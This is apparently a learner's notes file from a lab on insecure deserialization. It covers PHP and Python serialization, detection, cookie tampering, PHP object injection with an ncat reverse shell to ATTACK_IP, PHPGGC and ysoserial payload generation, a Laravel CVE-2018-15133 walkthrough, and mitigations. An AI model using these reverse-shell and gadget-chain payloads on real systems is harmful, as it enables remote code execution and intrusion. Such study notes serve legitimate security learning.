@@ -1,0 +1,211 @@
+__________________________________________________________________________________________
+
+
+TASK 3 Serialization Formats
+
+Serialisation is the process of converting an object's state into a storable or transmittable format, with deserialisation reversing the process. 
+Different programming languages implement serialisation uniquely:
+
+PHP:    Uses serialize() and unserialize() functions. 
+        Objects can define custom serialisation behavior with magic methods like __sleep() and __wakeup(). 
+        Such as, a Notes class can be serialised and stored, then reconstructed later.
+
+        PHP has magic methods for serialisation:
+        __sleep()       : Runs before serialisation, cleans up resources, and returns properties to save.
+        __wakeup()      : Runs after deserialisation, restores connections or resources.
+        __serialize()   : From PHP 7.4, customises serialisation by returning an array of data.
+        __unserialize() : Restores an object from custom serialised data.
+
+Python: Utilises the pickle module for serialisation (pickling) and deserialisation (unpickling). 
+        Binary data is often encoded in Base64 for safe transmission. 
+        Such as, notes class instance can be pickled, Base64-encoded, and later unpickled.
+
+        Pickling Process
+            Notes class: Manages a list of notes with methods to add and retrieve them.
+            Serialisation: Converts the Notes object into a binary format using pickle.dumps().
+
+        Displaying Serialised Data (Base64 Encoding)
+            Why base64: Converts binary data to readable text for safe transmission.
+            Encoding: Serialised data is encoded to base64 using base64.b64encode().
+
+        Deserialisation (Unpickling)
+            Base64 decoding: Converts base64 text back to binary using base64.b64decode().
+            Unpickling: Restores the original object from binary using pickle.loads().
+
+Other languages like Java, .NET, and Ruby also support serialisation with their own libraries and methods.
+
+__________________________________________________________________________________________
+
+
+TASK 4 Identification
+
+To identify serialization vulnerabilities, use white-box testing (reviewing source code for serialization functions) and black-box testing (analyzing server responses and inspecting cookies or fields for serialized data). 
+Attackers may also append a tilde (~) to PHP file names to access backup or temporary files created by editors or version control systems.
+
+White-box Testing:
+- Review code for serialization functions like serialize(), unserialize(), pickle.loads(), etc.
+- Focus on user-supplied input passed to these functions.
+
+Black-box Testing:
+- Analyze server responses for error messages (e.g., unserialize() errors) or inconsistencies in behavior when modifying serialized data.
+- Examine cookies for Base64-encoded values (common in PHP and .NET) or fields like __VIEWSTATE in .NET applications, which may contain serialized data.
+
+These methods help detect vulnerabilities, paving the way for exploitation and mitigation techniques.
+
+For example, adding ~ at the end of http://10.81.175.111/who/index.php~
+
+__________________________________________________________________________________________
+
+
+TASK 5 Exploitation - Update Properties
+
+Look for cookie in browser, observe that it's base64 PHP serialization, change the boolean value to 1.
+
+O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
+O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:1;}
+
+__________________________________________________________________________________________
+
+
+TASK 6 Exploitation - Object Injection
+
+Vulnerability
+
+    The code references a file called test.php, which contains the MaliciousUserData class as shown below:
+    
+    /*************************************************************************************
+    * <?php
+    * class MaliciousUserData {
+    * public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
+    *     
+    *     public function __wakeup() { 
+    *     exec($this->command);
+    * ...
+    * 
+    * ?>
+    *************************************************************************************/
+
+    In the above code, insecure deserialization allows manipulation of object properties, such as altering the `command` property of the `MaliciousUserData` class. 
+    By crafting a serialized string with desired property values, attackers can inject it into the vulnerable `unserialize()` function. 
+    Upon deserialization, the manipulated values are loaded into the object.
+
+    During insecure deserialization, the __wakeup method's definition cannot be directly altered. 
+    However, its behavior can be manipulated by modifying object properties, enabling different outcomes upon deserialization.
+
+
+Preparing the Payload
+
+    The index.php payload unserializes input without sanitization. 
+    By modifying the MaliciousUserData class and its `command` attribute, the attacker can control the value executed when the __wakeup function is called.
+
+            
+    /*************************************************************************************
+    * <?php
+    * class MaliciousUserData {
+    * public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
+    * }
+    * 
+    * $maliciousUserData = new MaliciousUserData();
+    * $serializedData = serialize($maliciousUserData);
+    * $base64EncodedData = base64_encode($serializedData);
+    * echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
+    * ?>
+    *************************************************************************************/
+
+    1. The __wakeup() function in the MaliciousUserData class (test.php) executes a reverse shell command using Ncat to connect to ATTACK_IP on port 4444, running /bin/sh as a shell.
+    2. Save the code in a file and execute it with `php index.php` in the terminal. This generates a base64-encoded serialized object of the MaliciousUserData class.
+    3. The generated base64 string will look like: TzoxNzoiTWFsaWNp[Redacted].
+    4. Start a Netcat listener on port 4444 using `nc -nvlp 4444` on the AttackBox.
+    5. Exploit the vulnerability by visiting the URL: `http://10.81.175.111/case2/?decode=[SHELLCODE]`.
+    6. The index.php file will deserialize the string and execute the __wakeup() function, resulting in a remote shell.
+
+__________________________________________________________________________________________
+
+
+TASK 7 Automation Scripts
+
+Automating scripts during pen-testing is crucial for identifying and exploiting vulnerabilities efficiently. PHPGGC (PHP Gadget Chain) is a tool for generating gadget chains to exploit PHP object injection vulnerabilities.
+
+PHPGGC for PHP
+    Purpose: 
+        Generates serialized payloads for exploiting insecure deserialization.
+
+    Features:
+        - Predefined gadget chains for popular PHP frameworks.
+        - Payload customization for specific attack scenarios.
+        - Supports frameworks like Laravel, CakePHP, and CodeIgniter.
+
+    Usage:
+    1. List Gadget Chains:
+        php phpggc -l
+
+        Example output:
+        NAME              VERSION   TYPE       VECTOR
+        Laravel/RCE1      5.4.27    RCE        __destruct
+        CakePHP/RCE1      <= 3.9.6  RCE        __destruct
+
+    2. Generate Payload:
+        phpggc Laravel/RCE3 system whoami
+
+        Example payload:
+        O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{...}
+
+        add -b t return payload in base64 encoded format
+
+    Exploiting Laravel (CVE-2018-15133):
+    1.  Get APP_KEY: 
+            Provided by this lab through social engineering
+            Obtain the Laravel APP_KEY (e.g., via http://target/get-key).
+
+    2.  Generate Payload: 
+            Use PHPGGC to create a base64 encoded serialized payload.
+            phpggc -b Laravel/RCE3 "uname -r"
+
+    3.  Encrypt Payload: 
+            Encrypt the payload with the APP_KEY.
+            Below is a tool provided by this lab to encrypt the payload with APP_KEY.
+            http://10.80.160.18:8089/cve.php?app_key=xx&payload=xxx
+
+    4.  Send Request:
+            curl http://target -X POST -H 'X-XSRF-TOKEN: <encrypted_payload>'
+
+    5.  Response:
+            ATTACK_PC $ curl http://target -X POST -H 'X-XSRF-TOKEN: <encrypted_payload>'
+            % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                            Dload  Upload   Total   Spent    Left  Speed
+            100  4200    0  4200    0     0   2119      0 --:--:--  5.15.0-1075-aws-     0
+            0<!DOCTYPE html><!--
+            100  4200    0  4200    0     0   1866      0 --:--:--  0:00:02 --:--:--  1866
+            curl: (23) Failure writing output to destination, passed 4200 returned 3992
+
+Ysoserial for Java
+
+    Ysoserial tests Java serialization vulnerabilities by generating exploit payloads. 
+    Use `java -jar ysoserial.jar [payload type] '[command]'` to create serialized objects. 
+    Example: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'` runs `calc.exe`. 
+    Available on GitHub.
+
+__________________________________________________________________________________________
+
+
+TASK 8 Mitigation Measures
+
+Red Teamer / Pentester Perspective
+
+    - Analyze code          : Review the app's serialization and deserialization processes.
+    - Find vulnerabilities  : Use tools to detect insecure deserialization and outdated libraries.
+    - Test inputs           : Use fuzzing to send unexpected data and monitor app behavior.
+    - Check error handling  : Look for error messages or stack traces revealing system details.
+
+Secure Coder Perspective
+
+    - Use safe formats      : Prefer JSON or XML with validation over insecure formats.
+    - Avoid risky functions : Do not use eval() or exec() to prevent code execution risks.
+    - Validate inputs       : Ensure only valid data is accepted and sanitize before serialization.
+    - Follow best practices : Apply secure coding principles like least privilege and defense in depth.
+    - Stick to guidelines   : Follow secure coding standards for your language or framework.
+
+__________________________________________________________________________________________
+
+
+Appendix:
